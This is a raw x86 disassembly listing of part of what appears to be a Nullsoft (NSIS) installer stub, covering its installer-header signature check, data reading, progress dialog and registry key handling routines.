  402be0:	8b f0                	mov    %eax,%esi
  402be2:	e8 eb 01 00 00       	call   0x402dd2
  402be7:	3b f3                	cmp    %ebx,%esi
  402be9:	74 37                	je     0x402c22
  402beb:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  402bee:	51                   	push   %ecx
  402bef:	50                   	push   %eax
  402bf0:	ff 15 9c 82 40 00    	call   *0x40829c
  402bf6:	85 c0                	test   %eax,%eax
  402bf8:	7c 28                	jl     0x402c22
  402bfa:	8d 45 08             	lea    0x8(%ebp),%eax
  402bfd:	50                   	push   %eax
  402bfe:	53                   	push   %ebx
  402bff:	ff 75 dc             	push   -0x24(%ebp)
  402c02:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402c05:	50                   	push   %eax
  402c06:	ff d6                	call   *%esi
  402c08:	85 c0                	test   %eax,%eax
  402c0a:	7c 16                	jl     0x402c22
  402c0c:	ff 75 08             	push   0x8(%ebp)
  402c0f:	ff 75 f4             	push   -0xc(%ebp)
  402c12:	e8 a8 39 00 00       	call   0x4065bf
  402c17:	ff 75 08             	push   0x8(%ebp)
  402c1a:	ff 15 a0 82 40 00    	call   *0x4082a0
  402c20:	eb 34                	jmp    0x402c56
  402c22:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402c25:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402c2c:	66 89 18             	mov    %bx,(%eax)
  402c2f:	eb 25                	jmp    0x402c56
  402c31:	8b 0d 68 ea 42 00    	mov    0x42ea68,%ecx
  402c37:	53                   	push   %ebx
  402c38:	23 c8                	and    %eax,%ecx
  402c3a:	51                   	push   %ecx
  402c3b:	6a 0b                	push   $0xb
  402c3d:	ff 75 f8             	push   -0x8(%ebp)
  402c40:	ff 15 58 82 40 00    	call   *0x408258
  402c46:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  402c49:	74 0b                	je     0x402c56
  402c4b:	53                   	push   %ebx
  402c4c:	53                   	push   %ebx
  402c4d:	ff 75 f8             	push   -0x8(%ebp)
  402c50:	ff 15 54 82 40 00    	call   *0x408254
  402c56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c59:	01 05 88 47 43 00    	add    %eax,0x434788
  402c5f:	33 c0                	xor    %eax,%eax
  402c61:	5f                   	pop    %edi
  402c62:	5e                   	pop    %esi
  402c63:	5b                   	pop    %ebx
  402c64:	c9                   	leave
  402c65:	c2 04 00             	ret    $0x4
  402c68:	61                   	popa
  402c69:	2c 40                	sub    $0x40,%al
  402c6b:	00 91 14 40 00 9d    	add    %dl,-0x62ffbfec(%ecx)
  402c71:	14 40                	adc    $0x40,%al
  402c73:	00 b8 14 40 00 cb    	add    %bh,-0x34ffbfec(%eax)
  402c79:	14 40                	adc    $0x40,%al
  402c7b:	00 d7                	add    %dl,%bh
  402c7d:	14 40                	adc    $0x40,%al
  402c7f:	00 f5                	add    %dh,%ch
  402c81:	14 40                	adc    $0x40,%al
  402c83:	00 98 15 40 00 c8    	add    %bl,-0x37ffbfeb(%eax)
  402c89:	15 40 00 e6 15       	adc    $0x15e60040,%eax
  402c8e:	40                   	inc    %eax
  402c8f:	00 96 16 40 00 03    	add    %dl,0x3004016(%esi)
  402c95:	15 40 00 67 15       	adc    $0x15670040,%eax
  402c9a:	40                   	inc    %eax
  402c9b:	00 88 15 40 00 a7    	add    %cl,-0x58ffbfeb(%eax)
  402ca1:	16                   	push   %ss
  402ca2:	40                   	inc    %eax
  402ca3:	00 f8                	add    %bh,%al
  402ca5:	16                   	push   %ss
  402ca6:	40                   	inc    %eax
  402ca7:	00 61 17             	add    %ah,0x17(%ecx)
  402caa:	40                   	inc    %eax
  402cab:	00 88 17 40 00 9b    	add    %cl,-0x64ffbfe9(%eax)
  402cb1:	17                   	pop    %ss
  402cb2:	40                   	inc    %eax
  402cb3:	00 38                	add    %bh,(%eax)
  402cb5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cb8:	3b 19                	cmp    (%ecx),%ebx
  402cba:	40                   	inc    %eax
  402cbb:	00 6d 19             	add    %ch,0x19(%ebp)
  402cbe:	40                   	inc    %eax
  402cbf:	00 82 19 40 00 94    	add    %al,-0x6bffbfe7(%edx)
  402cc5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cc8:	2b 1a                	sub    (%edx),%ebx
  402cca:	40                   	inc    %eax
  402ccb:	00 5c 1a 40          	add    %bl,0x40(%edx,%ebx,1)
  402ccf:	00 9e 1a 40 00 de    	add    %bl,-0x21ffbfe6(%esi)
  402cd5:	1a 40 00             	sbb    0x0(%eax),%al
  402cd8:	a3 1b 40 00 c7       	mov    %eax,0xc700401b
  402cdd:	1b 40 00             	sbb    0x0(%eax),%eax
  402ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce1:	1c 40                	sbb    $0x40,%al
  402ce3:	00 6f 1c             	add    %ch,0x1c(%edi)
  402ce6:	40                   	inc    %eax
  402ce7:	00 43 1d             	add    %al,0x1d(%ebx)
  402cea:	40                   	inc    %eax
  402ceb:	00 64 1d 40          	add    %ah,0x40(%ebp,%ebx,1)
  402cef:	00 89 1d 40 00 ad    	add    %cl,-0x52ffbfe3(%ecx)
  402cf5:	1d 40 00 7a 1e       	sbb    $0x1e7a0040,%eax
  402cfa:	40                   	inc    %eax
  402cfb:	00 0a                	add    %cl,(%edx)
  402cfd:	1f                   	pop    %ds
  402cfe:	40                   	inc    %eax
  402cff:	00 3e                	add    %bh,(%esi)
  402d01:	1f                   	pop    %ds
  402d02:	40                   	inc    %eax
  402d03:	00 d0                	add    %dl,%al
  402d05:	1f                   	pop    %ds
  402d06:	40                   	inc    %eax
  402d07:	00 22                	add    %ah,(%edx)
  402d09:	20 40 00             	and    %al,0x0(%eax)
  402d0c:	56                   	push   %esi
  402d0d:	20 40 00             	and    %al,0x0(%eax)
  402d10:	03 21                	add    (%ecx),%esp
  402d12:	40                   	inc    %eax
  402d13:	00 d6                	add    %dl,%dh
  402d15:	21 40 00             	and    %eax,0x0(%eax)
  402d18:	2b 23                	sub    (%ebx),%esp
  402d1a:	40                   	inc    %eax
  402d1b:	00 af 23 40 00 de    	add    %ch,-0x21ffbfdd(%edi)
  402d21:	23 40 00             	and    0x0(%eax),%eax
  402d24:	20 24 40             	and    %ah,(%eax,%eax,2)
  402d27:	00 60 24             	add    %ah,0x24(%eax)
  402d2a:	40                   	inc    %eax
  402d2b:	00 b6 24 40 00 56    	add    %dh,0x56004024(%esi)
  402d31:	25 40 00 ca 25       	and    $0x25ca0040,%eax
  402d36:	40                   	inc    %eax
  402d37:	00 34 26             	add    %dh,(%esi,%eiz,1)
  402d3a:	40                   	inc    %eax
  402d3b:	00 48 26             	add    %cl,0x26(%eax)
  402d3e:	40                   	inc    %eax
  402d3f:	00 6a 26             	add    %ch,0x26(%edx)
  402d42:	40                   	inc    %eax
  402d43:	00 18                	add    %bl,(%eax)
  402d45:	27                   	daa
  402d46:	40                   	inc    %eax
  402d47:	00 bb 28 40 00 f0    	add    %bh,-0xfffbfd8(%ebx)
  402d4d:	28 40 00             	sub    %al,0x0(%eax)
  402d50:	0a 29                	or     (%ecx),%ch
  402d52:	40                   	inc    %eax
  402d53:	00 37                	add    %dh,(%edi)
  402d55:	29 40 00             	sub    %eax,0x0(%eax)
  402d58:	7c 29                	jl     0x402d83
  402d5a:	40                   	inc    %eax
  402d5b:	00 87 2a 40 00 17    	add    %al,0x1700402a(%edi)
  402d61:	2b 40 00             	sub    0x0(%eax),%eax
  402d64:	85 2b                	test   %ebp,(%ebx)
  402d66:	40                   	inc    %eax
  402d67:	00 56 2c             	add    %dl,0x2c(%esi)
  402d6a:	40                   	inc    %eax
  402d6b:	00 31                	add    %dh,(%ecx)
  402d6d:	2c 40                	sub    $0x40,%al
  402d6f:	00 6a 26             	add    %ch,0x26(%edx)
  402d72:	40                   	inc    %eax
  402d73:	00 18                	add    %bl,(%eax)
  402d75:	27                   	daa
  402d76:	40                   	inc    %eax
  402d77:	00 0e                	add    %cl,(%esi)
  402d79:	1b 40 00             	sbb    0x0(%eax),%eax
  402d7c:	15 1b 40 00 1c       	adc    $0x1c00401b,%eax
  402d81:	1b 40 00             	sbb    0x0(%eax),%eax
  402d84:	21 1b                	and    %ebx,(%ebx)
  402d86:	40                   	inc    %eax
  402d87:	00 31                	add    %dh,(%ecx)
  402d89:	1b 40 00             	sbb    0x0(%eax),%eax
  402d8c:	35 1b 40 00 39       	xor    $0x3900401b,%eax
  402d91:	1b 40 00             	sbb    0x0(%eax),%eax
  402d94:	42                   	inc    %edx
  402d95:	1b 40 00             	sbb    0x0(%eax),%eax
  402d98:	4b                   	dec    %ebx
  402d99:	1b 40 00             	sbb    0x0(%eax),%eax
  402d9c:	58                   	pop    %eax
  402d9d:	1b 40 00             	sbb    0x0(%eax),%eax
  402da0:	68 1b 40 00 86       	push   $0x8600401b
  402da5:	1b 40 00             	sbb    0x0(%eax),%eax
  402da8:	8d 1b                	lea    (%ebx),%ebx
  402daa:	40                   	inc    %eax
  402dab:	00 94 1b 40 00 8b 44 	add    %dl,0x448b0040(%ebx,%ebx,1)
  402db2:	24 04                	and    $0x4,%al
  402db4:	8b 0d 4c ce 40 00    	mov    0x40ce4c,%ecx
  402dba:	56                   	push   %esi
  402dbb:	ff 34 81             	push   (%ecx,%eax,4)
  402dbe:	6a 00                	push   $0x0
  402dc0:	e8 37 38 00 00       	call   0x4065fc
  402dc5:	8b f0                	mov    %eax,%esi
  402dc7:	56                   	push   %esi
  402dc8:	e8 52 37 00 00       	call   0x40651f
  402dcd:	0f b7 16             	movzwl (%esi),%edx
  402dd0:	5e                   	pop    %esi
  402dd1:	c3                   	ret
  402dd2:	56                   	push   %esi
  402dd3:	8b 74 24 08          	mov    0x8(%esp),%esi
  402dd7:	85 f6                	test   %esi,%esi
  402dd9:	57                   	push   %edi
  402dda:	8b c6                	mov    %esi,%eax
  402ddc:	7d 02                	jge    0x402de0
  402dde:	f7 d8                	neg    %eax
  402de0:	8b 15 4c ce 40 00    	mov    0x40ce4c,%edx
  402de6:	8b c8                	mov    %eax,%ecx
  402de8:	83 e1 0f             	and    $0xf,%ecx
  402deb:	c1 f8 04             	sar    $0x4,%eax
  402dee:	ff 34 8a             	push   (%edx,%ecx,4)
  402df1:	c1 e0 0b             	shl    $0xb,%eax
  402df4:	05 f0 a5 40 00       	add    $0x40a5f0,%eax
  402df9:	50                   	push   %eax
  402dfa:	e8 fd 37 00 00       	call   0x4065fc
  402dff:	85 f6                	test   %esi,%esi
  402e01:	8b f8                	mov    %eax,%edi
  402e03:	7d 06                	jge    0x402e0b
  402e05:	57                   	push   %edi
  402e06:	e8 62 3a 00 00       	call   0x40686d
  402e0b:	8b c7                	mov    %edi,%eax
  402e0d:	5f                   	pop    %edi
  402e0e:	5e                   	pop    %esi
  402e0f:	c2 04 00             	ret    $0x4
  402e12:	55                   	push   %ebp
  402e13:	8b ec                	mov    %esp,%ebp
  402e15:	8d 45 08             	lea    0x8(%ebp),%eax
  402e18:	50                   	push   %eax
  402e19:	8b 45 08             	mov    0x8(%ebp),%eax
  402e1c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e21:	50                   	push   %eax
  402e22:	6a 22                	push   $0x22
  402e24:	e8 a9 ff ff ff       	call   0x402dd2
  402e29:	50                   	push   %eax
  402e2a:	a1 4c ce 40 00       	mov    0x40ce4c,%eax
  402e2f:	ff 70 04             	push   0x4(%eax)
  402e32:	e8 13 00 00 00       	call   0x402e4a
  402e37:	50                   	push   %eax
  402e38:	e8 ef 35 00 00       	call   0x40642c
  402e3d:	f7 d8                	neg    %eax
  402e3f:	1b c0                	sbb    %eax,%eax
  402e41:	f7 d0                	not    %eax
  402e43:	23 45 08             	and    0x8(%ebp),%eax
  402e46:	5d                   	pop    %ebp
  402e47:	c2 04 00             	ret    $0x4
  402e4a:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e4e:	85 c0                	test   %eax,%eax
  402e50:	7c 0d                	jl     0x402e5f
  402e52:	8b 0d 84 47 43 00    	mov    0x434784,%ecx
  402e58:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402e5f:	c2 04 00             	ret    $0x4
  402e62:	55                   	push   %ebp
  402e63:	8b ec                	mov    %esp,%ebp
  402e65:	8d 45 10             	lea    0x10(%ebp),%eax
  402e68:	50                   	push   %eax
  402e69:	8b 45 10             	mov    0x10(%ebp),%eax
  402e6c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e71:	50                   	push   %eax
  402e72:	ff 75 0c             	push   0xc(%ebp)
  402e75:	ff 75 08             	push   0x8(%ebp)
  402e78:	e8 cd ff ff ff       	call   0x402e4a
  402e7d:	50                   	push   %eax
  402e7e:	e8 d7 35 00 00       	call   0x40645a
  402e83:	f7 d8                	neg    %eax
  402e85:	1b c0                	sbb    %eax,%eax
  402e87:	f7 d0                	not    %eax
  402e89:	23 45 10             	and    0x10(%ebp),%eax
  402e8c:	5d                   	pop    %ebp
  402e8d:	c2 0c 00             	ret    $0xc
  402e90:	55                   	push   %ebp
  402e91:	8b ec                	mov    %esp,%ebp
  402e93:	56                   	push   %esi
  402e94:	8b 75 0c             	mov    0xc(%ebp),%esi
  402e97:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402e9b:	75 07                	jne    0x402ea4
  402e9d:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402ea2:	eb 2c                	jmp    0x402ed0
  402ea4:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402eab:	8d 45 10             	lea    0x10(%ebp),%eax
  402eae:	50                   	push   %eax
  402eaf:	ff 75 08             	push   0x8(%ebp)
  402eb2:	e8 93 ff ff ff       	call   0x402e4a
  402eb7:	50                   	push   %eax
  402eb8:	e8 ee 34 00 00       	call   0x4063ab
  402ebd:	85 c0                	test   %eax,%eax
  402ebf:	74 0c                	je     0x402ecd
  402ec1:	ff 75 10             	push   0x10(%ebp)
  402ec4:	56                   	push   %esi
  402ec5:	50                   	push   %eax
  402ec6:	e8 0a 00 00 00       	call   0x402ed5
  402ecb:	eb 03                	jmp    0x402ed0
  402ecd:	6a 06                	push   $0x6
  402ecf:	58                   	pop    %eax
  402ed0:	5e                   	pop    %esi
  402ed1:	5d                   	pop    %ebp
  402ed2:	c2 0c 00             	ret    $0xc
  402ed5:	55                   	push   %ebp
  402ed6:	8b ec                	mov    %esp,%ebp
  402ed8:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402ede:	53                   	push   %ebx
  402edf:	56                   	push   %esi
  402ee0:	8b 75 10             	mov    0x10(%ebp),%esi
  402ee3:	57                   	push   %edi
  402ee4:	8b fe                	mov    %esi,%edi
  402ee6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ee9:	81 e6 00 03 00 00    	and    $0x300,%esi
  402eef:	50                   	push   %eax
  402ef0:	8b c6                	mov    %esi,%eax
  402ef2:	83 e7 01             	and    $0x1,%edi
  402ef5:	0c 09                	or     $0x9,%al
  402ef7:	50                   	push   %eax
  402ef8:	ff 75 0c             	push   0xc(%ebp)
  402efb:	ff 75 08             	push   0x8(%ebp)
  402efe:	e8 29 35 00 00       	call   0x40642c
  402f03:	33 db                	xor    %ebx,%ebx
  402f05:	3b c3                	cmp    %ebx,%eax
  402f07:	0f 85 ab 00 00 00    	jne    0x402fb8
  402f0d:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402f11:	74 23                	je     0x402f36
  402f13:	53                   	push   %ebx
  402f14:	53                   	push   %ebx
  402f15:	53                   	push   %ebx
  402f16:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402f19:	53                   	push   %ebx
  402f1a:	50                   	push   %eax
  402f1b:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f21:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402f24:	50                   	push   %eax
  402f25:	53                   	push   %ebx
  402f26:	ff 75 fc             	push   -0x4(%ebp)
  402f29:	ff 15 00 80 40 00    	call   *0x408000
  402f2f:	3d 03 01 00 00       	cmp    $0x103,%eax
  402f34:	75 67                	jne    0x402f9d
  402f36:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f3c:	68 05 01 00 00       	push   $0x105
  402f41:	50                   	push   %eax
  402f42:	53                   	push   %ebx
  402f43:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402f49:	eb 27                	jmp    0x402f72
  402f4b:	85 ff                	test   %edi,%edi
  402f4d:	75 4e                	jne    0x402f9d
  402f4f:	ff 75 10             	push   0x10(%ebp)
  402f52:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f58:	50                   	push   %eax
  402f59:	ff 75 fc             	push   -0x4(%ebp)
  402f5c:	e8 74 ff ff ff       	call   0x402ed5
  402f61:	85 c0                	test   %eax,%eax
  402f63:	75 16                	jne    0x402f7b
  402f65:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f6b:	68 05 01 00 00       	push   $0x105
  402f70:	50                   	push   %eax
  402f71:	57                   	push   %edi
  402f72:	ff 75 fc             	push   -0x4(%ebp)
  402f75:	ff d3                	call   *%ebx
  402f77:	85 c0                	test   %eax,%eax
  402f79:	74 d0                	je     0x402f4b
  402f7b:	ff 75 fc             	push   -0x4(%ebp)
  402f7e:	ff 15 10 80 40 00    	call   *0x408010
  402f84:	6a 03                	push   $0x3
  402f86:	e8 28 3a 00 00       	call   0x4069b3
  402f8b:	85 c0                	test   %eax,%eax
  402f8d:	75 1e                	jne    0x402fad
  402f8f:	ff 75 0c             	push   0xc(%ebp)
  402f92:	ff 75 08             	push   0x8(%ebp)
  402f95:	ff 15 18 80 40 00    	call   *0x408018
  402f9b:	eb 1b                	jmp    0x402fb8
  402f9d:	ff 75 fc             	push   -0x4(%ebp)
  402fa0:	ff 15 10 80 40 00    	call   *0x408010
  402fa6:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402fab:	eb 0b                	jmp    0x402fb8
  402fad:	6a 00                	push   $0x0
  402faf:	56                   	push   %esi
  402fb0:	ff 75 0c             	push   0xc(%ebp)
  402fb3:	ff 75 08             	push   0x8(%ebp)
  402fb6:	ff d0                	call   *%eax
  402fb8:	5f                   	pop    %edi
  402fb9:	5e                   	pop    %esi
  402fba:	5b                   	pop    %ebx
  402fbb:	c9                   	leave
  402fbc:	c2 0c 00             	ret    $0xc
  402fbf:	55                   	push   %ebp
  402fc0:	8b ec                	mov    %esp,%ebp
  402fc2:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402fc8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402fcf:	75 19                	jne    0x402fea
  402fd1:	6a 00                	push   $0x0
  402fd3:	68 fa 00 00 00       	push   $0xfa
  402fd8:	6a 01                	push   $0x1
  402fda:	ff 75 08             	push   0x8(%ebp)
  402fdd:	ff 15 18 82 40 00    	call   *0x408218
  402fe3:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402fea:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402ff1:	75 4c                	jne    0x40303f
  402ff3:	8b 0d 18 6a 41 00    	mov    0x416a18,%ecx
  402ff9:	a1 24 aa 42 00       	mov    0x42aa24,%eax
  402ffe:	3b c8                	cmp    %eax,%ecx
  403000:	72 02                	jb     0x403004
  403002:	8b c8                	mov    %eax,%ecx
  403004:	50                   	push   %eax
  403005:	6a 64                	push   $0x64
  403007:	51                   	push   %ecx
  403008:	ff 15 48 81 40 00    	call   *0x408148
  40300e:	50                   	push   %eax
  40300f:	8d 45 80             	lea    -0x80(%ebp),%eax
  403012:	68 1c a0 40 00       	push   $0x40a01c
  403017:	50                   	push   %eax
  403018:	ff 15 2c 82 40 00    	call   *0x40822c
  40301e:	83 c4 0c             	add    $0xc,%esp
  403021:	8d 45 80             	lea    -0x80(%ebp),%eax
  403024:	50                   	push   %eax
  403025:	ff 75 08             	push   0x8(%ebp)
  403028:	ff 15 1c 82 40 00    	call   *0x40821c
  40302e:	8d 45 80             	lea    -0x80(%ebp),%eax
  403031:	50                   	push   %eax
  403032:	68 06 04 00 00       	push   $0x406
  403037:	ff 75 08             	push   0x8(%ebp)
  40303a:	e8 be 2b 00 00       	call   0x405bfd
  40303f:	33 c0                	xor    %eax,%eax
  403041:	c9                   	leave
  403042:	c2 10 00             	ret    $0x10
  403045:	56                   	push   %esi
  403046:	33 f6                	xor    %esi,%esi
  403048:	39 74 24 08          	cmp    %esi,0x8(%esp)
  40304c:	74 18                	je     0x403066
  40304e:	a1 20 aa 42 00       	mov    0x42aa20,%eax
  403053:	3b c6                	cmp    %esi,%eax
  403055:	74 07                	je     0x40305e
  403057:	50                   	push   %eax
  403058:	ff 15 10 82 40 00    	call   *0x408210
  40305e:	89 35 20 aa 42 00    	mov    %esi,0x42aa20
  403064:	5e                   	pop    %esi
  403065:	c3                   	ret
  403066:	39 35 20 aa 42 00    	cmp    %esi,0x42aa20
  40306c:	74 08                	je     0x403076
  40306e:	56                   	push   %esi
  40306f:	e8 7b 39 00 00       	call   0x4069ef
  403074:	5e                   	pop    %esi
  403075:	c3                   	ret
  403076:	ff 15 d0 80 40 00    	call   *0x4080d0
  40307c:	3b 05 0c 47 43 00    	cmp    0x43470c,%eax
  403082:	76 23                	jbe    0x4030a7
  403084:	56                   	push   %esi
  403085:	68 bf 2f 40 00       	push   $0x402fbf
  40308a:	56                   	push   %esi
  40308b:	6a 6f                	push   $0x6f
  40308d:	ff 35 00 47 43 00    	push   0x434700
  403093:	ff 15 14 82 40 00    	call   *0x408214
  403099:	6a 05                	push   $0x5
  40309b:	50                   	push   %eax
  40309c:	a3 20 aa 42 00       	mov    %eax,0x42aa20
  4030a1:	ff 15 28 82 40 00    	call   *0x408228
  4030a7:	5e                   	pop    %esi
  4030a8:	c3                   	ret
  4030a9:	55                   	push   %ebp
  4030aa:	8b ec                	mov    %esp,%ebp
  4030ac:	83 ec 28             	sub    $0x28,%esp
  4030af:	53                   	push   %ebx
  4030b0:	56                   	push   %esi
  4030b1:	57                   	push   %edi
  4030b2:	33 ff                	xor    %edi,%edi
  4030b4:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4030b7:	89 7d f8             	mov    %edi,-0x8(%ebp)
  4030ba:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4030bd:	ff 15 d0 80 40 00    	call   *0x4080d0
  4030c3:	be 00 28 44 00       	mov    $0x442800,%esi
  4030c8:	68 00 04 00 00       	push   $0x400
  4030cd:	05 e8 03 00 00       	add    $0x3e8,%eax
  4030d2:	56                   	push   %esi
  4030d3:	57                   	push   %edi
  4030d4:	a3 0c 47 43 00       	mov    %eax,0x43470c
  4030d9:	ff 15 c4 80 40 00    	call   *0x4080c4
  4030df:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4030e4:	eb 27                	jmp    0x40310d
  4030e6:	ff 15 c8 80 40 00    	call   *0x4080c8
  4030ec:	83 f8 20             	cmp    $0x20,%eax
  4030ef:	0f 85 1c 01 00 00    	jne    0x403211
  4030f5:	ff 45 fc             	incl   -0x4(%ebp)
  4030f8:	83 7d fc 06          	cmpl   $0x6,-0x4(%ebp)
  4030fc:	0f 87 0f 01 00 00    	ja     0x403211
  403102:	68 fa 00 00 00       	push   $0xfa
  403107:	ff 15 d4 80 40 00    	call   *0x4080d4
  40310d:	6a 03                	push   $0x3
  40310f:	57                   	push   %edi
  403110:	56                   	push   %esi
  403111:	e8 99 2f 00 00       	call   0x4060af
  403116:	8b d8                	mov    %eax,%ebx
  403118:	83 fb ff             	cmp    $0xffffffff,%ebx
  40311b:	89 1d 18 a0 40 00    	mov    %ebx,0x40a018
  403121:	74 c3                	je     0x4030e6
  403123:	56                   	push   %esi
  403124:	be 00 08 44 00       	mov    $0x440800,%esi
  403129:	56                   	push   %esi
  40312a:	e8 90 34 00 00       	call   0x4065bf
  40312f:	56                   	push   %esi
  403130:	e8 a5 2d 00 00       	call   0x405eda
  403135:	50                   	push   %eax
  403136:	68 00 30 44 00       	push   $0x443000
  40313b:	e8 7f 34 00 00       	call   0x4065bf
  403140:	6a 00                	push   $0x0
  403142:	53                   	push   %ebx
  403143:	ff 15 cc 80 40 00    	call   *0x4080cc
  403149:	85 c0                	test   %eax,%eax
  40314b:	a3 24 aa 42 00       	mov    %eax,0x42aa24
  403150:	8b f0                	mov    %eax,%esi
  403152:	0f 86 f8 00 00 00    	jbe    0x403250
  403158:	a1 14 47 43 00       	mov    0x434714,%eax
  40315d:	8b fe                	mov    %esi,%edi
  40315f:	f7 d8                	neg    %eax
  403161:	1b c0                	sbb    %eax,%eax
  403163:	25 00 7e 00 00       	and    $0x7e00,%eax
  403168:	05 00 02 00 00       	add    $0x200,%eax
  40316d:	3b f0                	cmp    %eax,%esi
  40316f:	72 02                	jb     0x403173
  403171:	8b f8                	mov    %eax,%edi
  403173:	57                   	push   %edi
  403174:	68 20 6a 41 00       	push   $0x416a20
  403179:	e8 b1 03 00 00       	call   0x40352f
  40317e:	85 c0                	test   %eax,%eax
  403180:	0f 84 36 01 00 00    	je     0x4032bc
  403186:	83 3d 14 47 43 00 00 	cmpl   $0x0,0x434714
  40318d:	0f 85 88 00 00 00    	jne    0x40321b
  403193:	6a 1c                	push   $0x1c
  403195:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403198:	68 20 6a 41 00       	push   $0x416a20
  40319d:	50                   	push   %eax
  40319e:	e8 c7 2e 00 00       	call   0x40606a
  4031a3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4031a6:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  4031ab:	75 7c                	jne    0x403229
  4031ad:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  4031b4:	75 73                	jne    0x403229
  4031b6:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  4031bd:	75 6a                	jne    0x403229
  4031bf:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  4031c6:	75 61                	jne    0x403229
  4031c8:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  4031cf:	75 58                	jne    0x403229
  4031d1:	09 45 08             	or     %eax,0x8(%ebp)
  4031d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4031d7:	8b 0d 18 6a 41 00    	mov    0x416a18,%ecx
  4031dd:	83 e0 02             	and    $0x2,%eax
  4031e0:	09 05 a0 47 43 00    	or     %eax,0x4347a0
  4031e6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4031e9:	3b c6                	cmp    %esi,%eax
  4031eb:	89 0d 14 47 43 00    	mov    %ecx,0x434714
  4031f1:	0f 87 be 00 00 00    	ja     0x4032b5
  4031f7:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  4031fb:	75 06                	jne    0x403203
  4031fd:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403201:	75 4d                	jne    0x403250
  403203:	ff 45 f8             	incl   -0x8(%ebp)
  403206:	8d 70 fc             	lea    -0x4(%eax),%esi
  403209:	3b fe                	cmp    %esi,%edi
  40320b:	76 1c                	jbe    0x403229
  40320d:	8b fe                	mov    %esi,%edi
  40320f:	eb 18                	jmp    0x403229
  403211:	b8 e8 a1 40 00       	mov    $0x40a1e8,%eax
  403216:	e9 f2 00 00 00       	jmp    0x40330d
  40321b:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  40321f:	75 08                	jne    0x403229
  403221:	6a 00                	push   $0x0
  403223:	e8 1d fe ff ff       	call   0x403045
  403228:	59                   	pop    %ecx
  403229:	3b 35 24 aa 42 00    	cmp    0x42aa24,%esi
  40322f:	73 11                	jae    0x403242
  403231:	57                   	push   %edi
  403232:	68 20 6a 41 00       	push   $0x416a20
  403237:	ff 75 f4             	push   -0xc(%ebp)
  40323a:	e8 61 38 00 00       	call   0x406aa0
  40323f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403242:	01 3d 18 6a 41 00    	add    %edi,0x416a18
  403248:	2b f7                	sub    %edi,%esi
  40324a:	0f 85 08 ff ff ff    	jne    0x403158
  403250:	6a 01                	push   $0x1
  403252:	e8 ee fd ff ff       	call   0x403045
  403257:	33 ff                	xor    %edi,%edi
  403259:	59                   	pop    %ecx
  40325a:	39 3d 14 47 43 00    	cmp    %edi,0x434714
  403260:	74 53                	je     0x4032b5
  403262:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  403265:	74 22                	je     0x403289
  403267:	ff 35 18 6a 41 00    	push   0x416a18
  40326d:	e8 d3 02 00 00       	call   0x403545
  403272:	8d 45 08             	lea    0x8(%ebp),%eax
  403275:	6a 04                	push   $0x4
  403277:	50                   	push   %eax
  403278:	e8 b2 02 00 00       	call   0x40352f
  40327d:	85 c0                	test   %eax,%eax
  40327f:	74 34                	je     0x4032b5
  403281:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403284:	3b 45 08             	cmp    0x8(%ebp),%eax
  403287:	75 2c                	jne    0x4032b5
  403289:	ff 75 ec             	push   -0x14(%ebp)
  40328c:	6a 40                	push   $0x40
  40328e:	ff 15 10 81 40 00    	call   *0x408110
  403294:	8b f0                	mov    %eax,%esi
  403296:	a1 14 47 43 00       	mov    0x434714,%eax
  40329b:	83 c0 1c             	add    $0x1c,%eax
  40329e:	50                   	push   %eax
  40329f:	e8 a1 02 00 00       	call   0x403545
  4032a4:	ff 75 ec             	push   -0x14(%ebp)
  4032a7:	56                   	push   %esi
  4032a8:	57                   	push   %edi
  4032a9:	6a ff                	push   $0xffffffff
  4032ab:	e8 64 00 00 00       	call   0x403314
  4032b0:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4032b3:	74 11                	je     0x4032c6
